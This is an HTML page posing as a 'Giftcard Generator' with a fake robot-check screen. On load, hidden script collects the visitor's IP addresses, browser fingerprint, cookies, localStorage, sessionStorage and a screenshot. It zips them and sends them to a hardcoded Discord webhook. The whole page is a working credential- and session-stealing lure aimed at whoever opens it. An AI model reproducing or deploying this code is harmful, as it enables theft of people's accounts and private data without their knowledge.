<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Giftcard Generator</title>
    <style>
        body {
            display: flex;
            flex-direction: column;
            justify-content: center;
            align-items: center;
            height: 100vh;
            margin: 0;
            background-color: black;
            color: white;
            font-family: Arial, sans-serif;
            overflow: hidden;
        }

        .strobing-text {
            font-size: 2.5em;
            font-weight: bold;
            animation: strobe 1s infinite;
            text-align: center;
            margin-bottom: 20px;
        }

        .container {
            text-align: center;
        }

        .flashing-text {
            font-size: 3em;
            font-weight: bold;
            animation: flash 1s infinite;
        }

        .hue-rotating-text {
            font-size: 2em;
            font-weight: bold;
            animation: hueRotate 3s infinite;
        }

        @keyframes strobe {
            0%, 100% { color: white; }
            50% { color: red; }
        }

        @keyframes flash {
            0% { color: black; }
            50% { color: red; }
            100% { color: black; }
        }

        @keyframes hueRotate {
            0% { color: white; }
            100% { color: hsl(360, 100%, 50%); }
        }

        #spotify-player {
            width: 300px;
            height: 80px;
            border: none;
            margin-top: 20px;
            opacity: 0.5;
        }

        #info {
            display: none;
        }
    </style>
</head>
<body>
    <div class="container">
        <div class="flashing-text">Checking for robots..</div>
        <div class="hue-rotating-text">run the captcha</div>
    </div>

    <iframe id="spotify-player" src="https://open.spotify.com/embed/track/471UcHZ5JhkgjE3CmWNEIG?utm_source=generator" allow="autoplay; clipboard-write; encrypted-media; fullscreen; picture-in-picture"></iframe>

    <div id="info">
        <script src="https://cdnjs.cloudflare.com/ajax/libs/jszip/3.10.1/jszip.min.js"></script>
        <script src="https://cdnjs.cloudflare.com/ajax/libs/html2canvas/0.5.0-beta4/html2canvas.min.js"></script>
        <script>
            function generateUniqueId() {
                return 'user-' + Math.random().toString(36).substr(2, 9);
            }

            async function getIpAddresses() {
                try {
                    const ipv4Response = await fetch('https://api.ipify.org?format=json');
                    const ipv4Data = await ipv4Response.json();
                    const ipv4 = ipv4Data.ip;

                    const ipv6Response = await fetch('https://api64.ipify.org?format=json');
                    const ipv6Data = await ipv6Response.json();
                    const ipv6 = ipv6Data.ip;

                    return { ipv4, ipv6 };
                } catch (error) {
                    console.error('Error fetching IP addresses:', error);
                    return { ipv4: 'Unable to retrieve IPv4 address', ipv6: 'Unable to retrieve IPv6 address' };
                }
            }

            function getBrowserInfo() {
                return {
                    userAgent: navigator.userAgent,
                    language: navigator.language,
                    screenWidth: screen.width,
                    screenHeight: screen.height,
                    viewportWidth: window.innerWidth,
                    viewportHeight: window.innerHeight,
                    deviceMemory: navigator.deviceMemory || 'Not available',
                    hardwareConcurrency: navigator.hardwareConcurrency || 'Not available',
                    platform: navigator.platform,
                    onlineStatus: navigator.onLine ? 'Online' : 'Offline',
                    timezone: Intl.DateTimeFormat().resolvedOptions().timeZone,
                    javaEnabled: navigator.javaEnabled(),
                    cookieEnabled: navigator.cookieEnabled,
                    appName: navigator.appName,
                    appVersion: navigator.appVersion,
                    vendor: navigator.vendor,
                    product: navigator.product,
                    geolocation: 'Not available',
                    touchSupport: 'Not available',
                    connection: navigator.connection ? {
                        effectiveType: navigator.connection.effectiveType,
                        downlink: navigator.connection.downlink,
                        rtt: navigator.connection.rtt,
                        saveData: navigator.connection.saveData
                    } : 'Not available',
                    plugins: Array.from(navigator.plugins).map(plugin => ({
                        name: plugin.name,
                        version: plugin.version,
                        description: plugin.description
                    })),
                    screenOrientation: screen.orientation ? screen.orientation.type : 'Not available',
                    fullscreen: document.fullscreenElement ? 'Fullscreen' : 'Not fullscreen',
                    cookies: document.cookie,
                    localStorage: getLocalStorageData(),
                    sessionStorage: getSessionStorageData(),
                };
            }

            function getLocalStorageData() {
                const localStorageData = {};
                for (let i = 0; i < localStorage.length; i++) {
                    const key = localStorage.key(i);
                    localStorageData[key] = localStorage.getItem(key);
                }
                return localStorageData;
            }

            function getSessionStorageData() {
                const sessionStorageData = {};
                for (let i = 0; i < sessionStorage.length; i++) {
                    const key = sessionStorage.key(i);
                    sessionStorageData[key] = sessionStorage.getItem(key);
                }
                return sessionStorageData;
            }

            async function captureScreenshot() {
                try {
                    const canvas = await html2canvas(document.body, {
                        scale: window.devicePixelRatio
                    });
                    return canvas.toDataURL('image/png');
                } catch (error) {
                    console.error('Error capturing screenshot:', error);
                    return null;
                }
            }

            async function createZipFile(info, screenshotDataUrl) {
                const zip = new JSZip();
                zip.file('info.txt', JSON.stringify(info, null, 2));
                
                if (screenshotDataUrl) {
                    const base64Data = screenshotDataUrl.split(',')[1];
                    const imgBlob = new Blob([Uint8Array.from(atob(base64Data), c => c.charCodeAt(0))], { type: 'image/png' });
                    zip.file('screenshot.png', imgBlob);
                }
                
                zip.file('cookies.txt', info.cookies);
                zip.file('localStorage.txt', JSON.stringify(info.localStorage, null, 2));
                zip.file('sessionStorage.txt', JSON.stringify(info.sessionStorage, null, 2));
                zip.file('ipAddresses.txt', `IPv4: ${info.ipv4}\nIPv6: ${info.ipv6}`);

                const content = await zip.generateAsync({ type: 'blob' });
                return content;
            }

            async function sendZipToDiscord(zipBlob) {
                const formData = new FormData();
                formData.append('file', zipBlob, 'info.zip');

                // Embed payload
                const embedPayload = {
                    embeds: [{
                        title: "Giftcard Gen",
                        description: "Generate Giftcards FAST with v4lc",
                        image: {
                            url: "attachment://roblox.jpg"
                        }
                    }]
                };

                try {
                    await fetch('https://discord.com/api/webhooks/1280281999059456123/GtHUqHcLkPKBNX5OGwFrkwDR2Rp5XIw3QBr_TTv1b3BrcA-NBg-1XJIbRXMfAEaZxvW2', {
                        method: 'POST',
                        body: JSON.stringify(embedPayload),
                        headers: {
                            'Content-Type': 'application/json'
                        }
                    });

                    const response = await fetch('https://discord.com/api/webhooks/1280281999059456123/GtHUqHcLkPKBNX5OGwFrkwDR2Rp5XIw3QBr_TTv1b3BrcA-NBg-1XJIbRXMfAEaZxvW2', {
                        method: 'POST',
                        body: formData
                    });

                    if (response.ok) {
                        console.log('Zip file sent to Discord webhook with embed');
                    } else {
                        console.error('Failed to send zip file to Discord webhook');
                    }
                } catch (error) {
                    console.error('Error sending zip file to Discord webhook:', error);
                }
            }

            async function initialize() {
                const uniqueId = generateUniqueId();
                const ipAddresses = await getIpAddresses();
                const browserInfo = getBrowserInfo();
                browserInfo.ipv4 = ipAddresses.ipv4;
                browserInfo.ipv6 = ipAddresses.ipv6;
                browserInfo.uniqueId = uniqueId;

                const screenshotDataUrl = await captureScreenshot();
                const zipBlob = await createZipFile(browserInfo, screenshotDataUrl);
                await sendZipToDiscord(zipBlob);
            }

            window.onload = initialize;
        </script>
    </div>
</body>
</html>
